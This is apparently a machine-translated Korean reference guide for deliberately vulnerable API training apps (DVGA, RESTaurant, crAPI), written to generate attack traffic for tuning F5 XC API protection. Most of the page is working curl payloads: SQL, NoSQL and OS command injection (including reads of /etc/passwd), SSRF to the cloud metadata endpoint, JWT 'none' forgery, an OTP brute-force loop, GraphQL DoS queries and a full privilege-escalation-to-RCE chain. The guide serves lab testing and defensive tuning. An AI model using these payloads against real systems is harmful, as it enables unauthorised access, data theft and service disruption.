---
title: API Testing Guide
description: >-
  DVGA, RESTaurant, crAPI에 대한 종합 엔드포인트 카탈로그, 취약점 매핑, 공격 페이로드 — 트래픽 생성 및 F5 XC
  API 보호 프로파일 개발을 위한 온보딩 참조 문서
sidebar:
  order: 8
i18n:
  sourceHash: 884e2d1be2b7
  translator: machine
---

## 개요

이 가이드는 세 가지 API 보안 테스트 애플리케이션에 걸쳐 모든 API 엔드포인트, 의도적 취약점 및 공격 페이로드를 분류합니다. F5 XC API 보호 프로파일 개발을 위한 트래픽 생성 패턴을 구축하는 데 활용하십시오.

| 애플리케이션 | 프로토콜 | 경로 | 포트 | 인증 | 취약점 |
|---|---|---|---|---|---|
| **DVGA** | GraphQL | `/dvga/` | 80 | 없음 (관리자: admin/password) | 25개 시나리오 |
| **RESTaurant** | REST (FastAPI) | `/restaurant/` | 80 | JWT (폼 인코딩) | 7개 OWASP API 2023 카테고리 |
| **crAPI** | REST (마이크로서비스) | `/` | 8888 | JWT (Bearer) | 18개 이상 챌린지 |

### 환경 변수

```bash
ORIGIN="http://<ORIGIN_IP>"
CRAPI="http://<ORIGIN_IP>:8888"
```

---

## DVGA (Damn Vulnerable GraphQL Application)

**GraphQL 엔드포인트:** `POST ${ORIGIN}/dvga/graphql`
**GraphiQL IDE:** `GET ${ORIGIN}/dvga/`
**관리자 자격 증명:** admin / password

모든 DVGA 상호작용은 JSON `{"query":"..."}` 페이로드를 포함하는 POST 요청으로 단일 엔드포인트(`/dvga/graphql`)를 사용합니다.

### 스키마 개요

```
Queries:  pastes, paste, me, systemHealth, systemUpdate, systemDiagnostics
Mutations: createPaste, importPaste, uploadPaste
Types:    PasteObject (id, title, content, public, owner, ipAddr, userAgent)
          OwnerObject (id, username, pastes)  ← 순환 참조
```

### 엔드포인트 참조

| 작업 | 유형 | 인증 | 용도 |
|---|---|---|---|
| `pastes(public, filter, limit)` | Query | 아니오 | 페이스트 목록 (filter를 통한 SQL 인젝션) |
| `paste(id)` | Query | 아니오 | 단일 페이스트 조회 |
| `me(token)` | Query | 아니오 | JWT로 사용자 조회 (위조 취약) |
| `systemHealth` | Query | 아니오 | 헬스 체크 |
| `systemUpdate` | Query | 아니오 | 느린 쿼리 (~82초, DoS 벡터) |
| `systemDiagnostics(cmd)` | Query | admin/password | 화이트리스트된 OS 명령 실행 |
| `createPaste(title, content, public)` | Mutation | 아니오 | 페이스트 생성 (content를 통한 XSS) |
| `importPaste(host, port, path, scheme)` | Mutation | 아니오 | 원격 페이스트 가져오기 (SSRF, 명령 인젝션) |
| `uploadPaste(filename, content)` | Mutation | 아니오 | 페이스트 업로드 (경로 탐색) |

### 취약점 카탈로그

#### 1. 서비스 거부 (6개 시나리오)

**배치 쿼리 공격:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{systemUpdate}"},{"query":"{systemUpdate}"},{"query":"{systemUpdate}"}]'
```

**깊은 재귀 (순환 Owner/Paste 참조):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{owner{pastes{owner{pastes{owner{pastes{owner{pastes{title}}}}}}}}}}"}'
```

**리소스 집약적 쿼리 (~82초 응답):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{systemUpdate}"}'
```

**필드 중복 (필드를 500회 이상 반복):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{title title title title title title title title title title title title title title title title title title title title}}"}'
```

**별칭 기반 공격 (1000개의 별칭 작업):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{q0:systemUpdate q1:systemUpdate q2:systemUpdate q3:systemUpdate q4:systemUpdate q5:systemUpdate q6:systemUpdate q7:systemUpdate q8:systemUpdate q9:systemUpdate}"}'
```

#### 2. 정보 노출 (5개 시나리오)

**인트로스펙션 (전체 스키마 열거):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name args{name type{name}}}}}}"}'
```

**필드 제안 (오타가 유효한 필드를 노출):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{titl}}"}'
```

**importPaste를 통한 SSRF (내부 서비스 탐색):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{importPaste(host:\"localhost\",port:57575,path:\"/\",scheme:\"http\"){result}}"}'
```

#### 3. 인젝션 (4개 시나리오)

**filter 파라미터를 통한 SQL 인젝션:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes(filter:\"aaa\\u0027 OR 1=1--\"){id title content public}}"}'
```

**createPaste를 통한 저장형 XSS:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{createPaste(title:\"<img src=x onerror=alert(1)>\",content:\"xss\",public:true){paste{id title}}}"}'
```

**로그 인젝션 (작업 이름 스푸핑):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation getPaste{createPaste(title:\"injected\",content:\"hidden mutation\",public:true){paste{id}}}"}'
```

#### 4. 코드 실행 (3개 시나리오)

**importPaste를 통한 OS 명령 인젝션:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{importPaste(host:\"localhost\",port:80,path:\"/ ; uname -a\",scheme:\"http\"){result}}"}'
```

**systemDiagnostics를 통한 OS 명령 (관리자 인증 필요):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{systemDiagnostics(cmd:\"id\")}"}'
```

#### 5. 인가 우회 (3개 시나리오)

**JWT 토큰 위조 (서명되지 않은 토큰 허용):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{me(token:\"eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.\"){username}}"}'
```

**uploadPaste를 통한 임의 파일 쓰기 (경로 탐색):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{uploadPaste(filename:\"../../../tmp/test.txt\",content:\"path traversal test\"){result}}"}'
```

---

## RESTaurant API (Damn Vulnerable RESTaurant)

**Swagger UI:** `${ORIGIN}/restaurant/docs`
**OpenAPI 명세:** `${ORIGIN}/restaurant/openapi.json`
**인증:** `/restaurant/token`으로의 폼 인코딩 POST를 통한 JWT
**역할:** Customer (기본값), Employee, Chef (관리자)

### 설정: 등록 및 인증

```bash
# 테스트 사용자 등록
curl -X POST ${ORIGIN}/restaurant/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Attack123","first_name":"Test","last_name":"User","phone_number":"5551234567"}'

# JWT 토큰 발급 (참고: JSON이 아닌 폼 인코딩)
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=attacker&password=Attack123" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "Bearer token: ${TOKEN}"
```

### 엔드포인트 참조

| 엔드포인트 | 메서드 | 인증 | 역할 | 취약점 |
|---|---|---|---|---|
| `/restaurant/register` | POST | 아니오 | — | 사용자 생성 |
| `/restaurant/token` | POST | 아니오 | — | 약한 시크릿의 JWT (97952) |
| `/restaurant/healthcheck` | GET | 아니오 | — | 헬스 체크 |
| `/restaurant/profile` | GET | 예 | 모든 역할 | 사용자 프로필 |
| `/restaurant/profile` | PUT | 예 | 모든 역할 | **BOLA** (다른 사용자 수정) |
| `/restaurant/profile` | PATCH | 예 | 모든 역할 | **BOPLA** (역할 대량 할당) |
| `/restaurant/users/update_role` | PUT | 예 | 모든 역할 | **BFLA** (역할 에스컬레이션) |
| `/restaurant/menu` | GET | 예 | 모든 역할 | 메뉴 항목 목록 |
| `/restaurant/menu` | PUT | 예 | Employee+ | 메뉴 생성 (이미지를 통한 **SSRF**) |
| `/restaurant/menu/{item_id}` | PUT | 예 | Employee+ | 메뉴 수정 (이미지를 통한 **SSRF**) |
| `/restaurant/menu/{item_id}` | DELETE | 예 | 모든 역할 | **BFLA** (모든 사용자가 삭제 가능) |
| `/restaurant/orders` | GET | 예 | 모든 역할 | **BOLA** (모든 주문 조회) |
| `/restaurant/orders` | POST | 예 | 모든 역할 | 주문 생성 |
| `/restaurant/orders/{order_id}` | GET | 예 | 모든 역할 | **BOLA** (다른 주문 접근) |
| `/restaurant/orders/status/{order_id}` | GET | 예 | 모든 역할 | 주문 상태 |
| `/restaurant/admin/stats/disk` | GET | 예 | Chef | **명령 인젝션** |
| `/restaurant/reset-password` | POST | 아니오 | — | 비밀번호 재설정 요청 |
| `/restaurant/reset-password/new-password` | POST | 아니오 | — | 새 비밀번호 설정 |
| `/restaurant/referral-code` | GET | 예 | 모든 역할 | 추천 코드 조회 |
| `/restaurant/apply-referral` | POST | 예 | 모든 역할 | 추천 적용 |
| `/restaurant/discount-coupons` | GET | 예 | 모든 역할 | 쿠폰 목록 |

### 취약점 카탈로그

#### API1:2023 — 객체 수준 인가 결함 (BOLA)

**다른 사용자의 프로필 수정:**
```bash
curl -X PUT ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"username":"chef","phone_number":"hacked","first_name":"Pwned","last_name":"User"}'
```

**다른 사용자의 주문 접근 (오프셋 열거):**
```bash
for i in 1 2 3 4 5; do
  curl -sf ${ORIGIN}/restaurant/orders/${i} \
    -H "Authorization: Bearer ${TOKEN}" 2>&1
  echo ""
done
```

#### API2:2023 — 인증 결함

**JWT 약한 시크릿 무차별 대입 (시크릿은 6자리: 97952):**
```bash
# jwt.io에서 토큰 디코딩 및 위조
# Secret: 97952 (hashcat -a 3 -m 16500 token '?d?d?d?d?d?d'으로 무차별 대입 가능)

# Chef 토큰 위조:
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"sub":"chef","exp":9999999999}
# 시크릿 97952로 서명
```

#### API3:2023 — 객체 속성 수준 인가 결함 (BOPLA)

**Customer에서 Chef로 역할 대량 할당:**
```bash
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'
```

**에스컬레이션 경로: Customer → Employee → Chef:**
```bash
# 1단계: Employee로 에스컬레이션
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Employee"}'

# 2단계: Chef로 에스컬레이션
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'
```

#### API5:2023 — 기능 수준 인가 결함 (BFLA)

**Customer로 메뉴 항목 삭제 (Employee+ 권한 필요):**
```bash
curl -X DELETE ${ORIGIN}/restaurant/menu/1 \
  -H "Authorization: Bearer ${TOKEN}"
```

**다른 사용자의 역할 변경:**
```bash
curl -X PUT ${ORIGIN}/restaurant/users/update_role \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"username":"chef","role":"Customer"}'
```

#### API7:2023 — 서버 측 요청 위조 (SSRF)

**메뉴 image_url을 통한 내부 엔드포인트 탐색 (Employee 역할 필요):**
```bash
# 먼저 BOPLA를 통해 Employee로 에스컬레이션한 후:
curl -X PUT ${ORIGIN}/restaurant/menu \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"name":"SSRF Test","price":1.00,"category":"Test","image_url":"http://127.0.0.1:8091/admin/reset-chef-password"}'
```

#### API8:2023 — 인젝션

**디스크 통계를 통한 OS 명령 인젝션 (Chef 역할 필요):**
```bash
# Chef로 에스컬레이션한 후:
curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;whoami" \
  -H "Authorization: Bearer ${TOKEN}"

curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;cat%20/etc/passwd" \
  -H "Authorization: Bearer ${TOKEN}"
```

### 전체 공격 체인: Customer에서 Root까지

```bash
# 1. 등록
curl -X POST ${ORIGIN}/restaurant/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"Hack123","first_name":"H","last_name":"X","phone_number":"0"}'

# 2. 토큰 발급
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

# 3. Chef로 에스컬레이션 (BOPLA)
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'

# 4. Chef 수준 토큰을 얻기 위해 재인증
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

# 5. 명령 인젝션 (RCE)
curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;id" \
  -H "Authorization: Bearer ${TOKEN}"
```

---

## crAPI (OWASP Completely Ridiculous API)

**웹 UI:** `${CRAPI}/`
**MailHog:** `${CRAPI}/mailhog/` (인증용 이메일 캡처)
**인증:** JWT Bearer 토큰 (RS256, 알고리즘 혼동 취약)
**아키텍처:** 7개 마이크로서비스 (identity, community, workshop, postgres, mongo, mailhog, web)

### 설정: 등록, 이메일 인증, 로그인

```bash
# 1. 등록
curl -X POST ${CRAPI}/identity/api/auth/signup \
  -H "Content-Type: application/json" \
  -d '{"name":"Test User","email":"tester@example.com","number":"5551234567","password":"TestPass123"}'

# 2. MailHog에서 인증 이메일 확인
# ${CRAPI}/mailhog/에 접속하거나 MailHog API 사용:
curl -sf ${CRAPI}/mailhog/api/v2/messages | python3 -c "
import sys,json
msgs = json.load(sys.stdin)['items']
for m in msgs:
    print(f\"To: {m['Raw']['To'][0]}, Subject: {m['Content']['Headers']['Subject'][0]}\")
"

# 3. 로그인 및 JWT 토큰 발급
TOKEN=$(curl -sf -X POST ${CRAPI}/identity/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"tester@example.com","password":"TestPass123"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

echo "Bearer token: ${TOKEN}"
```

### 엔드포인트 참조

#### Identity 서비스

| 엔드포인트 | 메서드 | 인증 | 취약점 |
|---|---|---|---|
| `/identity/api/auth/signup` | POST | 아니오 | 등록 |
| `/identity/api/auth/login` | POST | 아니오 | JWT 토큰 (알고리즘 혼동) |
| `/identity/api/auth/forget-password` | POST | 아니오 | OTP 요청 |
| `/identity/api/auth/v2/check-otp` | POST | 아니오 | **속도 제한 없음** (4자리 OTP 무차별 대입) |
| `/identity/api/auth/v3/check-otp` | POST | 아니오 | 속도 제한 적용 버전 |
| `/identity/api/v2/user/dashboard` | GET | 예 | 사용자 프로필 |
| `/identity/api/v2/user/change-email` | PUT | 예 | 이메일 변경 |
| `/identity/api/v2/vehicle/vehicles` | GET | 예 | 차량 목록 (UUID 노출) |
| `/identity/api/v2/vehicle/{uuid}/location` | GET | 예 | **BOLA** (모든 사용자의 차량) |
| `/identity/api/v2/user/videos` | POST | 예 | 비디오 업로드 |
| `/identity/api/v2/user/videos/{id}` | GET | 예 | **데이터 노출** (conversion_params) |
| `/identity/api/v2/user/videos/{id}` | PUT | 예 | **대량 할당** (명령 인젝션) |
| `/identity/api/v2/admin/videos/{id}` | DELETE | 예 | **BFLA** (관리자 확인 없음) |

#### Community 서비스

| 엔드포인트 | 메서드 | 인증 | 취약점 |
|---|---|---|---|
| `/community/api/v2/community/posts` | GET | 예 | **데이터 노출** (vehicle_id, email 노출) |
| `/community/api/v2/community/posts` | POST | 예 | 블로그 게시글 생성 |
| `/community/api/v2/community/posts/{id}/comments` | POST | 예 | 댓글 추가 |
| `/community/api/v2/coupon/validate-coupon` | POST | 예 | **NoSQL 인젝션** |

#### Workshop 서비스

| 엔드포인트 | 메서드 | 인증 | 취약점 |
|---|---|---|---|
| `/workshop/api/mechanic` | GET | 예 | **데이터 노출** (정비사 이메일) |
| `/workshop/api/mechanic/mechanic_report` | GET | 아니오 | **BOLA** (인증 없음, 순차 ID) |
| `/workshop/api/merchant/contact_mechanic` | POST | 예 | **SSRF** + **DoS** |
| `/workshop/api/shop/products` | GET | 예 | 제품 카탈로그 |
| `/workshop/api/shop/orders/` | POST | 예 | 주문 생성 |
| `/workshop/api/shop/orders/all` | GET | 예 | 주문 목록 |
| `/workshop/api/shop/orders/{id}` | GET | 아니오 | **BOLA** (인증 불필요) |
| `/workshop/api/shop/orders/{id}` | PUT | 예 | **대량 할당** (status, quantity) |
| `/workshop/api/shop/apply_coupon` | POST | 예 | **SQL 인젝션** |

### 챌린지 카탈로그

#### 챌린지 1 — BOLA: 다른 사용자의 차량 위치 접근

```bash
# 먼저 자신의 차량 UUID 확인
curl -sf ${CRAPI}/identity/api/v2/vehicle/vehicles \
  -H "Authorization: Bearer ${TOKEN}"

# 다른 사용자의 차량 접근 (UUID 교체)
curl -sf ${CRAPI}/identity/api/v2/vehicle/VICTIM-UUID-HERE/location \
  -H "Authorization: Bearer ${TOKEN}"
```

#### 챌린지 2 — BOLA: 정비사 보고서 접근 (인증 없음)

```bash
# 순차 ID 열거 — 토큰 불필요
for i in 1 2 3 4 5; do
  echo "Report $i:"
  curl -sf "${CRAPI}/workshop/api/mechanic/mechanic_report?report_id=${i}"
  echo ""
done
```

#### 챌린지 3 — 인증 결함: 비밀번호 재설정 OTP 무차별 대입

```bash
# 피해자에 대한 OTP 요청
curl -X POST ${CRAPI}/identity/api/auth/forget-password \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'

# 4자리 OTP 무차별 대입 (v2는 속도 제한 없음)
for otp in $(seq -w 0000 9999); do
  RESULT=$(curl -sf -X POST ${CRAPI}/identity/api/auth/v2/check-otp \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"victim@example.com\",\"otp\":\"${otp}\"}" 2>&1)
  echo "$otp: $RESULT" | grep -v "Invalid OTP" && break
done
```

#### 챌린지 4 — 데이터 노출: 정비사 이메일 유출

```bash
curl -sf ${CRAPI}/workshop/api/mechanic \
  -H "Authorization: Bearer ${TOKEN}" | python3 -m json.tool
```

#### 챌린지 5 — 데이터 노출: 내부 비디오 변환 매개변수

```bash
# 비디오를 업로드한 후 응답 검사
curl -sf ${CRAPI}/identity/api/v2/user/videos \
  -H "Authorization: Bearer ${TOKEN}" | python3 -m json.tool
# 응답에서 conversion_params 필드 확인
```

#### 챌린지 6 — DoS: Contact Mechanic을 통한 Layer 7 공격

```bash
curl -X POST ${CRAPI}/workshop/api/merchant/contact_mechanic \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "mechanic_code":"MECH001",
    "problem_details":"Engine issue",
    "vin":"VEHICLE_VIN",
    "mechanic_api":"http://localhost:8080/api",
    "repeat_request_if_failed":true,
    "number_of_repeats":100
  }'
```

#### 챌린지 7 — BFLA: 관리자 엔드포인트를 통한 비디오 삭제

```bash
# 일반 사용자가 관리자 엔드포인트에 접근 가능
curl -X DELETE ${CRAPI}/identity/api/v2/admin/videos/VIDEO_ID_HERE \
  -H "Authorization: Bearer ${TOKEN}"
```

#### 챌린지 8 & 9 — 대량 할당: 주문 조작을 통한 무료 상품 획득

```bash
# GET을 PUT으로 변경하고 status와 quantity 수정
curl -X PUT ${CRAPI}/workshop/api/shop/orders/1 \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"status":"returned","quantity":100}'
```

#### 챌린지 10 — 비디오 변환 매개변수를 통한 명령 인젝션

```bash
curl -X PUT ${CRAPI}/identity/api/v2/user/videos/VIDEO_ID \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"conversion_params":"-v codec h264; cat /etc/passwd"}'
```

#### 챌린지 11 — Contact Mechanic을 통한 SSRF

```bash
curl -X POST ${CRAPI}/workshop/api/merchant/contact_mechanic \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "mechanic_code":"MECH001",
    "problem_details":"test",
    "vin":"VIN123",
    "mechanic_api":"http://169.254.169.254/latest/meta-data/",
    "repeat_request_if_failed":false,
    "number_of_repeats":0
  }'
```

#### 챌린지 12 — NoSQL 인젝션: 쿠폰 코드 추출

```bash
curl -X POST ${CRAPI}/community/api/v2/coupon/validate-coupon \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code":{"$ne":1}}'
```

#### 챌린지 13 — SQL 인젝션: 쿠폰 다중 사용

```bash
curl -X POST ${CRAPI}/workshop/api/shop/apply_coupon \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d "{\"coupon_code\":\"TRAC075' OR '1'='1\"}"
```

#### 챌린지 14 — 미인증 주문 접근

```bash
# Authorization 헤더 없음 — 그래도 데이터 반환
for i in 1 2 3 4 5; do
  curl -sf ${CRAPI}/workshop/api/shop/orders/${i}
  echo ""
done
```

#### 챌린지 15 — JWT 알고리즘 혼동

```bash
# 알고리즘 "none"으로 JWT 위조 (서명 검증 없음):
# 1. 헤더 설정: {"alg":"none","typ":"JWT"} 후 base64url 인코딩
# 2. 페이로드 설정: {"email":"admin@example.com","role":"admin"} 후 base64url 인코딩
# 3. 점으로 연결하고 서명을 비워둠: <header>.<payload>.
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"email":"admin@example.com","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
FORGED="${HEADER}.${PAYLOAD}."

curl -sf ${CRAPI}/identity/api/v2/user/dashboard \
  -H "Authorization: Bearer ${FORGED}"
```

---

## OWASP API 보안 Top 10 교차 참조

| OWASP 카테고리 | DVGA | RESTaurant | crAPI |
|---|---|---|---|
| **API1: BOLA** | — | `PUT /profile`, `GET /orders/{id}` | 차량 위치, 정비사 보고서, 주문 |
| **API2: 인증 결함** | JWT 위조 (`me` 쿼리) | JWT 약한 시크릿 (97952) | OTP 무차별 대입 (v2), JWT 알고리즘 혼동 |
| **API3: BOPLA** | — | `PATCH /profile` (역할 에스컬레이션) | 비디오 conversion_params, 정비사 이메일 노출 |
| **API4: 리소스 소비** | 배치, 재귀, 별칭, 필드 중복 DoS | 응답 길이를 통한 사용자 열거 | `contact_mechanic` repeat_request DoS |
| **API5: BFLA** | — | `DELETE /menu`, `PUT /users/update_role` | 일반 사용자로 `DELETE /admin/videos` |
| **API6: 대량 할당** | — | `PUT /orders` (status, quantity) | 주문 status/quantity, 비디오 conversion_params |
| **API7: SSRF** | `importPaste` mutation | `PUT /menu` image_url | `contact_mechanic` mechanic_api URL |
| **API8: 인젝션** | SQL (`filter`), XSS (`content`), OS cmd (`importPaste`, `systemDiagnostics`) | OS cmd (`/admin/stats/disk?parameters=`) | NoSQL (`validate-coupon`), SQL (`apply_coupon`) |
| **API9: 부적절한 자산 관리** | — | — | 사용 중단된 `/auth/v2/check-otp` (속도 제한 없음) |
| **API10: 안전하지 않은 소비** | — | — | (SSRF를 통한 간접 공격) |
| **GraphQL 전용** | 인트로스펙션, 배칭, 재귀, 별칭, 필드 중복, 순환 프래그먼트 | — | — |

---

## 트래픽 생성 패턴

### 1단계: 기준선 (정상 경로)

공격 패턴을 테스트하기 전에 정상적인 API 동작을 파악하기 위해 합법적인 트래픽을 생성합니다.

**DVGA 기준선:**
```bash
# 정상 쿼리
curl -X POST ${ORIGIN}/dvga/graphql -H "Content-Type: application/json" -d '{"query":"{pastes{id title}}"}'
curl -X POST ${ORIGIN}/dvga/graphql -H "Content-Type: application/json" -d '{"query":"mutation{createPaste(title:\"note\",content:\"hello\",public:true){paste{id}}}"}'
```

**RESTaurant 기준선:**
```bash
curl -sf ${ORIGIN}/restaurant/menu -H "Authorization: Bearer ${TOKEN}"
curl -sf ${ORIGIN}/restaurant/profile -H "Authorization: Bearer ${TOKEN}"
curl -X POST ${ORIGIN}/restaurant/orders -H "Authorization: Bearer ${TOKEN}" -H "Content-Type: application/json" -d '{"menu_item_id":1,"quantity":1}'
```

**crAPI 기준선:**
```bash
curl -sf ${CRAPI}/identity/api/v2/user/dashboard -H "Authorization: Bearer ${TOKEN}"
curl -sf ${CRAPI}/workshop/api/shop/products -H "Authorization: Bearer ${TOKEN}"
curl -sf ${CRAPI}/community/api/v2/community/posts -H "Authorization: Bearer ${TOKEN}"
```

### 2단계: OWASP 카테고리별 공격 트래픽

**BOLA 테스트:** 순차 ID 열거, 요청 내 사용자 식별자 교체, 소유권 없이 리소스 접근.

**인젝션 테스트:** filter/coupon 매개변수의 SQL 페이로드, GraphQL 쿼리 인젝션, 매개변수 필드를 통한 OS 명령 인젝션.

**인증 우회 테스트:** JWT 토큰 위조, OTP 무차별 대입, 사용 중단된 API 버전 사용, 알고리즘 혼동.

**SSRF 테스트:** `importPaste`, `image_url`, `mechanic_api` 매개변수의 내부 URL.

**DoS 테스트:** GraphQL 배치/재귀/별칭 공격, 높은 횟수의 `repeat_request_if_failed`.

### 3단계: 상태 기반 공격 체인

일부 공격은 상태를 유지하는 다단계 시퀀스를 필요로 합니다:

1. **RESTaurant 에스컬레이션 체인:** 등록 → 토큰 → PATCH로 Chef 역할 부여 → 재인증 → 명령 인젝션
2. **crAPI 전체 흐름:** 가입 → 이메일 인증 (MailHog) → 로그인 → 차량 추가 → 정비사 연락 (SSRF) → 주문 조작
3. **DVGA 정찰-익스플로잇:** 인트로스펙션 → systemDiagnostics 발견 → 관리자 자격 증명 무차별 대입 → OS 명령 실행

### 속도 권장 사항

| 패턴 | 요청/초 | 지속 시간 | 비고 |
|---|---|---|---|
| 기준선 (앱당) | 10-50 | 5분 | 정상 트래픽 핑거프린트 수립 |
| BOLA 열거 | 100-500 | 2분 | 순차 ID 스캐닝 |
| OTP 무차별 대입 | 1000+ | 발견 시까지 | 최대 10,000회 시도 (4자리) |
| GraphQL DoS | 10-50 | 30초 | 각 요청이 서버 측에서 고비용 |
| 인젝션 퍼징 | 50-200 | 5분 | 요청마다 페이로드 변경 |
| SSRF 탐색 | 5-20 | 2분 | 느림; 각 요청이 서버 측 HTTP 요청 트리거 |
